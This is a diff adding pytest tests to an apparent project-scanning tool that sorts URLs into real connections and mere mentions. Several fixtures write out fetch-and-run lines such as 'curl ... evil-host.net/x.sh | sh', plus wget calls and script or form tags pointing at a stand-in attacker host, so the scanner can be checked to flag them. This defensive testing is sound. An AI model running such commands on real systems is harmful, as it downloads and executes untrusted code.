@@ -1295,3 +1295,67 @@ def test_an_absolute_import_matching_two_files_names_neither(tmp_path):
     auth = {e["path"]: e["auth"] for e in routes(asf.collect(root)).values()}
     assert auth["/a-me"] == "not_detected" and auth["/b-me"] == "not_detected"
     assert auth["/pages"] == "global", "a unique match is still resolved"
+
+
+def test_urls_mentioned_in_text_are_not_connections(tmp_path):
+    root = write(tmp_path, {
+        "app/hints.py": (
+            'HINT = "Install Node.js (npm ships with it): https://nodejs.org"\n'
+            'CMD = "curl -sSfL https://raw.githubusercontent.com/x/install.sh | sh"\n'
+            '# docs at https://docs.example.org/guide\n'
+            'API = "https://api.github.com/repos/x"\n'
+            'URL = f"https://pypi.org/pypi/{name}/json"\n'),
+        "app/static/index.html": '<input placeholder="https://github.com/org/repo">\n'
+                                 '<script>fetch("https://cdn.vendor.io/a.js")</script>\n',
+        # Config files keep every URL: unquoted ones there are usually real.
+        "deploy/app.yml": "upstream: https://partner.example.net/api\n",
+        # Mentioned in one place, used in another: a connection.
+        "app/client.py": 'X = "see https://nodejs.org for details"\nY = "https://nodejs.org/dist"\n',
+    })
+    r = asf.collect(root)
+    real = {h["host"] for h in r["hosts"] if not h["mention"] and not h["sample"]}
+    mentioned = {h["host"] for h in r["hosts"] if h["mention"]}
+    assert {"api.github.com", "pypi.org", "cdn.vendor.io", "partner.example.net",
+            "nodejs.org", "raw.githubusercontent.com"} <= real,         "a string that runs curl may well be run: it is a connection"
+    assert {"docs.example.org", "github.com"} <= mentioned
+    assert r["summary"]["hosts"] == len(real)
+    assert r["summary"]["samples"]["mentions"] == len(mentioned)
+
+
+@pytest.mark.parametrize("line", [
+    'os.system("curl -s https://evil-host.net/x.sh | sh")',
+    'subprocess.run("wget -q https://evil-host.net/x")',
+    '<script src=https://evil-host.net/a.js></script>',
+    '<form action=https://evil-host.net/post>',
+    '<meta http-equiv="refresh" content="0;url=https://evil-host.net/">',
+    'const u = `${proxy}https://evil-host.net/api`;',
+    '<input data-placeholder="https://evil-host.net">',
+    'X = "prefix " "https://evil-host.net"',
+    'https://evil-host.net is where it goes',
+])
+def test_an_address_that_may_be_used_is_never_a_mention(tmp_path, line):
+    """Round 47 review: when in doubt, a connection -- never hidden."""
+    name = "app/page.html" if line.startswith("<") else "app/x.js"
+    root = write(tmp_path, {name: line + "\n"})
+    hosts = {h["host"]: h for h in asf.collect(root)["hosts"]}
+    assert hosts["evil-host.net"]["mention"] is False, line
+
+
+@pytest.mark.parametrize("line", [
+    '// see https://docs.acme.dev/guide',
+    '<!-- https://docs.acme.dev -->',
+    ' * @see https://docs.acme.dev',
+    "<input placeholder = 'https://docs.acme.dev'>",
+    'alert("Read https://docs.acme.dev first")',
+])
+def test_an_address_written_about_is_a_mention(tmp_path, line):
+    root = write(tmp_path, {"app/x.js": line + "\n"})
+    hosts = {h["host"]: h for h in asf.collect(root)["hosts"]}
+    assert hosts["docs.acme.dev"]["mention"] is True, line
+
+
+def test_a_private_address_in_frontend_prose_is_listed_not_counted(tmp_path):
+    root = write(tmp_path, {"web/app.js": 'document.title; alert("call http://10.2.3.4/admin");\n'})
+    r = asf.collect(root)
+    assert [(x["detail"], x["sample"]) for x in r["risks"]] == [("10.2.3.4", True)]
+    assert r["summary"]["risks"] == 0
